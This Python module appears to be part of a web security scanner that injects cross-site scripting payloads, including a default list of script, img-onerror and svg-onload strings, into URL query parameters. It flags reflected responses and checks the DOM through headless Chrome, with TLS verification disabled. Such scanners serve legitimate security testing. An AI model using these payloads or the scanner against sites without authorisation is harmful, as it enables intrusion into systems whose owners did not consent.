from __future__ import print_function
import requests
import threading
import re
import time
import six
import sys

from core.utils import log_info, COLOR_GREEN, COLOR_RED

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
except ImportError:
    webdriver = None

DEFAULT_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'\"><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
]

def load_payloads(payload_file, append=False):
    payloads = list(DEFAULT_PAYLOADS)
    if not payload_file:
        return payloads
    try:
        with open(payload_file, 'r') as f:
            custom_payloads = [line.strip() for line in f if line.strip()]
        if append:
            payloads.extend(custom_payloads)
        else:
            payloads = custom_payloads
    except Exception as e:
        log_info('[!] Failed to load payloads file: %s' % str(e), COLOR_RED)
    return payloads

def test_xss_reflected(url, param, payload, proxy=None):
    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy,
        }
    try:
        if '?' in url:
            base = url.split('?')[0]
            query = url.split('?')[1]
            params = query.split('&')
            new_params = []
            for p in params:
                key = p.split('=')[0]
                if key == param:
                    new_params.append(key + '=' + requests.utils.quote(payload))
                else:
                    new_params.append(p)
            new_query = '&'.join(new_params)
            new_url = base + '?' + new_query
        else:
            new_url = url + '?' + param + '=' + requests.utils.quote(payload)

        headers = {'User-Agent': 'Mozilla/5.0 Whitesecross/2.0'}
        r = requests.get(new_url, headers=headers, proxies=proxies, timeout=10, verify=False)
        if payload in r.text:
            return True, r.text
    except Exception:
        return False, None
    return False, None

def run_scanner(urls, threads, proxy=None, payload_file=None, append_payloads=False, dom_scan=False):
    payloads = load_payloads(payload_file, append_payloads)
    results = []
    lock = threading.Lock()

    def scan_url(url):
        # Extract params
        if '?' not in url:
            return
        query = url.split('?',1)[1]
        params = [p.split('=')[0] for p in query.split('&') if '=' in p]
        if not params:
            return
        for param in params:
            for payload in payloads:
                vulnerable, evidence = test_xss_reflected(url, param, payload, proxy)
                if vulnerable:
                    with lock:
                        log_info('[XSS] %s Parameter: %s Payload: %s' % (url, param, payload), COLOR_GREEN)
                        results.append({
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'Reflected',
                            'evidence': evidence[:200].replace('\n',' ')
                        })
        # DOM XSS scanning
        if dom_scan and webdriver:
            try:
                dom_vulns = dom_xss_test(url, params, payloads, proxy)
                with lock:
                    for v in dom_vulns:
                        log_info('[DOM-XSS] %s Parameter: %s Payload: %s' % (v['url'], v['parameter'], v['payload']), COLOR_GREEN)
                        results.append(v)
            except Exception as e:
                log_info('[!] DOM XSS scanning error: %s' % str(e), COLOR_RED)

    def dom_xss_test(url, params, payloads, proxy):
        dom_results = []
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        if proxy:
            chrome_options.add_argument('--proxy-server=%s' % proxy)
        driver = webdriver.Chrome(options=chrome_options)
        for param in params:
            for payload in payloads:
                test_url = inject_payload(url, param, payload)
                driver.get(test_url)
                time.sleep(1)
                # Look for alert presence or payload reflection in DOM (very basic)
                page_source = driver.page_source
                if payload in page_source:
                    dom_results.append({
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'DOM',
                        'evidence': page_source[:200].replace('\n',' ')
                    })
        driver.quit()
        return dom_results

    def inject_payload(url, param, payload):
        if '?' in url:
            base = url.split('?')[0]
            query = url.split('?')[1]
            params = query.split('&')
            new_params = []
            for p in params:
                key = p.split('=')[0]
                if key == param:
                    new_params.append(key + '=' + requests.utils.quote(payload))
                else:
                    new_params.append(p)
            new_query = '&'.join(new_params)
            return base + '?' + new_query
        else:
            return url + '?' + param + '=' + requests.utils.quote(payload)

    threads_list = []
    for url in urls:
        t = threading.Thread(target=scan_url, args=(url,))
        t.daemon = True
        threads_list.append(t)
        t.start()
        while len(threads_list) >= threads:
            threads_list[0].join()
            threads_list.pop(0)

    for t in threads_list:
        t.join()

    return results
